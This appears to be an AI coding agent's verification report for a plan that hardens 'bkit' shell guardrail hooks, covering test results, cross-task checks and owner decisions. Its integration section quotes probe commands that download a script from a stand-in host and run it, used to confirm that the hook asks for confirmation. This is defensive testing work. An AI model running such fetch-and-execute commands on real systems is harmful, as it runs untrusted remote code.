Verdict: PASS
Failures: 0
Fixable: false
Tasks: 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29
Loosened: none

<!-- verdict:end -->

# Plan Verification

## Scope

Holistic

## Groups Verified

8 of 8 (groups 1 to 8; the plan has 8 groups, 29 tasks).

## Integration Gaps

0 integration gaps.

`bkit tests changed --base=origin/dev --fallback=bkit:gate:static-unit` was run twice:

- First run (log `tests-changed-h8.log` in the scratchpad): the related run passed (229 of 229 files, 9315 passed, 2 skipped). The named run was then stopped from outside (`Terminated: 15`, exit 143) with no test failure reported, so it gave no result.
- Second run (log `/private/tmp/claude-501/-Users-christian-Documents-GitHub-bkit/5803913f-42ac-468c-b086-c3390e32060d/scratchpad/tests-changed-h8b.log`): exit 0, `verdict: PASS`. Related run: 229 of 229 files, 9315 passed, 2 skipped, 265 s, load average 9.4 on 10 cores. Named run: 227 of 227 files, 9284 passed, 2 skipped, 288 s, load average 13.4. The `node --test` suites passed with 0 failed.

Cross-group contracts hold:

- Groups 6 to 8 against groups 1 to 5: tasks 24, 25, 27 and 28 change only `.bkit/core/hooks/guardrails-shell.js`. Copied and downloaded scripts go into `st.produced` through `markProduced` (line 1161). Directories made earlier in the line go into `st.madeDirs`. The `ENOENT && st.commands > 0` quiet branch (line 1210) now covers only files that no earlier command named. The structured `targets` / `uncertain` / `limit` shape that `guardrails-tiers.js` and the host bridges read is unchanged. No `indexOf(t)` is left in the source or in any of the four installed copies.
- TASK 26 (group 8) with TASK 24 (group 6): the Cursor `fetch` case (`.bkit/core/.cursor/hooks/bkit-guardrails.cjs:84`) now composes `v.edits` through the same `shellEditContext` / `ADVICE_BUDGETS.cursor` seam as groups 1 and 2. So the download form that TASK 24 kept out of its Cursor test now reaches the model as well. Probed on the installed `.cursor/hooks/bkit-guardrails.cjs`: `curl -o /tmp/h8-s.py https://x.example/s.py && python3 /tmp/h8-s.py` returns `ask` with the fetch line plus `cannot be determined`. `curl https://off-list.example/x -o /dev/null && sed -i s/a/b/ docs/x.md` returns `ask` with the fetch line and `docs/x.md`. The `cp` / `mv` / `cp` to a relative path then run forms name `docs/x.md` with the per-file checklist. The allow-listed `curl -o` / `wget -O` then run forms, and `cp t*.py sub/`, report `cannot be determined`. `mkdir -p … && cp tpl.sh … && bash …` names `docs/x.md`. `cat tpl.py` and `git status` stay silent. Each call took 52 to 196 ms.
- TASK 21 (group 6) with TASK 13 (group 3): `write.ts` and `dist/install/write.js` land in the same commit (`b1bd32e62`). The TASK 13 and TASK 21 unit and upgrade cases passed in the same run.
- Rendered copies: `node dist/cli.js check` exits 0 and changes no tracked file (log `bkit-check-h8.log` in the same scratchpad). The four T6 mirror tests (TASK 29) passed in the gate run.

## Previously Attempted

- Holistic attempts 1 to 4: `build-plan-verify-holistic-1.md` to `-4.md` (CONCERNS each), remediated in `build-plan-gaps-remediate-holistic-1-log.md` to `-4-log.md`.
- Holistic attempt 5: `build-plan-verify-holistic-5.md` (FAIL, load timeouts). Owner chose Try again (`build-decision-1-6.md` Q1).
- Holistic attempts 6 and 7: `build-plan-verify-holistic-6.md` (PASS, groups 1 to 3) and `build-plan-verify-holistic-7.md` (PASS, groups 1 to 5, tasks 1 to 20). The second challenge round then added groups 6 to 8 (tasks 21 to 29).
- Group 6: `build-plan-verify-6-1.md` to `-6-5.md` (CONCERNS each, all on TASK 24), settled by `build-decision-1-9.md` (Q2 to Q6 accepted, Q7 and Q8 became tasks 28 and 29).
- Group 7: `build-plan-verify-7-1.md` and `-7-2.md` (PASS; gate fix in `build-plan-gaps-remediate-7-1-log.md`).
- Group 8: `build-plan-verify-8-1.md` (CONCERNS, TASK 26) and `-8-2.md` (PASS), remediated in `build-plan-gaps-remediate-8-1-log.md`.

## Notes

- Mode `Holistic`: all 8 groups and 29 tasks (task numbers 1 to 29; group 7 holds 28 and 29, group 8 holds 26 and 27). The run's diff `tmp/bkit-diff-787-show-authoring-rules.md` has partial diff coverage (20 largest files, 500 lines each), so I read the changed seams in the files directly. Code changes since holistic-7 (`fb4df0e54`): `guardrails-shell.js` and its four rendered copies, the Cursor bridge, `write.ts` / `dist/install/write.js`, three test files, `.bkit/version`, and the workflow-engine commit noted below.
- **TASK 24** was still `[ ]` in the plan, and it is now satisfied. Its planned test `flags a script an earlier copy or move produced` exists once and passed in this run. Its DONE WHEN forms work on the installed Cursor hook (see Integration Gaps). The six gaps that group 6 attempt 5 (`build-plan-verify-6-5.md`) left open are closed as follows:
  - Q2 to Q6 of `build-decision-1-9.md` accept them with `Decision: Accept`. These are the curl URL globbing, curl `%output{}`, wget `-p` and long-option prefixes, wget `-e` / `WGETRC` / `CURL_HOME`, and wget percent-decoded names. The owner answered "Yes, all recommended", so this is the owner's own acceptance, not an assumed one.
  - Q7 and Q8 became TASK 28 and TASK 29, and both are done.
- **TASK 18** is satisfied by owner acceptance (`build-decision-1-7.md` Q1, `Decision: Accept`). Its planned test `drops an entry the previous template shipped and the current one retired` does not exist, by that decision.
- **TASK 22** is satisfied by owner acceptance (`build-decision-1-8.md` Q1, `Decision: Accept`; the owner answered "A)" with no reason given). Its planned test `keeps a shell target eligible after an unverified Cursor edit reminder` does not exist, by that decision.
- **Derived Test Matrix:** 51 rows. Every row except the TASK 18 and TASK 22 rows names a test that exists once in its target file and passed in this run. The TASK 29 rows are the four `{host}: mirror matches its template` tests under `T6 — guardrails.cjs installed mirror is its rendered template`. The two accepted rows are covered by the decisions above.
- **TASK 12** still holds: the full gate passed on one complete run. The first run did not fail; it was cancelled from outside, and the second run is a full rerun, not a retry of failing tests. `dist/` holds no copy of the shell detector, which ships as a payload. I did not repeat the built-CLI dogfood, because this step may not build or install.
- **Documentation Updates:** the five rows were confirmed done in holistic-6. Groups 6 to 8 add no row.
- **Observability:** the new code adds no error path or log store. TASK 27's deadline reports the existing `analysis-limit` / uncertainty notice, and the hooks stay fail-open, matching `docs/observability.md`.
- **Test-first audit:** none was supplied to this round. Two tests are still unproven from earlier rounds, for the owner to answer at the end of the build: TASK 13 `upgrades shipped registrations without dropping consumer hook groups or permissions`, and TASK 22 `keeps a shell target eligible after an unverified Cursor edit reminder` (never written, by decision `build-decision-1-8.md`).
- **Decision records:** `build-decision-1-1.md` to `-1-6.md` chose Fix now or Try again and accept no gap. `-1-7.md` accepts TASK 18, `-1-8.md` accepts TASK 22, and `-1-9.md` accepts the five TASK 24 variants above.
- **Change outside the plan, not logged:** commit `812ea2197` changes the workflow engine (`.bkit/core/engine/commands/workflow/steps.ts` and `tests.ts`, plus `dist/` and `steps.test.ts`). It makes `touchedTests` skip red records for tests that the plan no longer names. No task owns it. It does not touch any task's code path, and its tests passed in this run.
- **Out-of-scope observations, not logged:**
  - From `build-plan-verify-8-2.md`: `keeps edit advice beside an off-list fetch` does not assert the `Command requires confirmation` line.
  - Inside an `ask`, the shared shell notice still says `The command is allowed.`
  - From holistic-2: `mergeManagedList` drops a consumer hook group whose command runs a file named like a bkit hook.

## Identified Gaps Log

None.

